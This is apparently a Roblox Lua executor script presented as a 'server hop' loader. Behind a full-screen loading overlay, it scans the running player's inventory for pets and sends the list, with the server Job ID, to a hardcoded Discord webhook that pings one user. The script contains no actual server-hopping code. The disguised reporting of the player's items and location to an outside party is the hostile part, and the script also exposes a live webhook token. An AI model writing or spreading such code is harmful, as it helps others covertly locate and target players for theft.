local desiredVersion = "1689"
local PlaceId = game.PlaceId

-- SERVICES
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local Player = Players.LocalPlayer

-- Clipboard compatibility
local setclipboard = setclipboard or toclipboard or (Clipboard and Clipboard.set)

repeat task.wait() until game:IsLoaded()
task.wait(5)

-- UI SETUP
local function createLoadingUI()
    local gui = Instance.new("ScreenGui")
    gui.Name = "ServerHopUI"
    gui.ResetOnSpawn = false
    gui.Parent = Player:WaitForChild("PlayerGui")

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    bg.BackgroundTransparency = 0.3
    bg.Parent = gui

    local statusLabel = Instance.new("TextLabel")
    statusLabel.Name = "StatusLabel"
    statusLabel.Size = UDim2.new(1, 0, 0, 60)
    statusLabel.Position = UDim2.new(0, 0, 0.4, 0)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = "üîÑ Loading..."
    statusLabel.Font = Enum.Font.SourceSansBold
    statusLabel.TextSize = 32
    statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    statusLabel.TextStrokeTransparency = 0.5
    statusLabel.Parent = bg

    return gui, statusLabel
end

local gui, statusLabel = createLoadingUI()

-- Get Version
local function getActualVersion()
    for _, obj in ipairs(game:GetDescendants()) do
        if obj:IsA("TextLabel") then
            local text = obj.Text
            local version = string.match(text, "^v(%d+)$")
            if version then return version end
        end
    end
    return nil
end

local function hasCorrectVersion()
    local actualVersion = getActualVersion()
    return actualVersion == desiredVersion
end

-- Inventory Scan: PETS ONLY
local function getPetsOnly()
    local items = {}
    local containers = {Player.Backpack, Player.Character}

    for _, container in ipairs(containers) do
        for _, item in ipairs(container:GetChildren()) do
            if item:IsA("Tool") then
                local itemName = item.Name
                if string.find(itemName:lower(), "kg") or string.find(itemName:lower(), "age") then
                    table.insert(items, itemName)
                end
            end
        end
    end

    return items
end

-- Format PETS
local function formatPetsList(pets)
    if #pets == 0 then return "No pets found." end
    table.sort(pets)
    local lines = {}
    for _, pet in ipairs(pets) do
        table.insert(lines, "- " .. pet)
    end
    return table.concat(lines, "\\n")
end

-- Send Webhook
local function sendWebhook(petsText)
    local webhookUrl = "https://discord.com/api/webhooks/1403212302605357088/iqWgOYegTK5wOyc_yspDLA2HglemNCckSpLcsun76id0AtotHuotJBET4wHwl1R_vb-M"
    local discordId = "910015978639872050"

    local embed = {
        title = "üêæ Pets Found!",
        description = string.format("Hey <@%s>, here are the pets in this server!\n\n**Job ID:** `%s`", discordId, game.JobId),
        color = 0x00FF00,
        fields = {{
            name = "Pets",
            value = petsText:sub(1, 1024), -- Discord max per field
            inline = false
        }},
        footer = {
            text = "Pet Collector ‚Ä¢ Server Hop"
        }
    }

    local data = HttpService:JSONEncode({embeds = {embed}})
    local success, response = pcall(function()
        return HttpService:RequestAsync({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = data
        })
    end)

    if success and response.StatusCode == 204 then
        print("[Webhook] Sent successfully.")
    else
        warn("[Webhook] Failed:", response and response.StatusMessage or "Unknown error")
        warn("[Webhook] Status Code: " .. tostring(response.StatusCode))
        warn("[Webhook] Response Body: " .. tostring(response.Body))
    end
end

-- MAIN LOOP
task.spawn(function()
    while true do
        if hasCorrectVersion() then
            statusLabel.Text = "‚úÖ Correct version found: " .. desiredVersion
            local pets = getPetsOnly()
            local petList = formatPetsList(pets)
            sendWebhook(petList)
            break
        else
            statusLabel.Text = "‚ùå Version not found. Retrying..."
            task.wait(3)
        end
        task.wait(1)
    end
end)
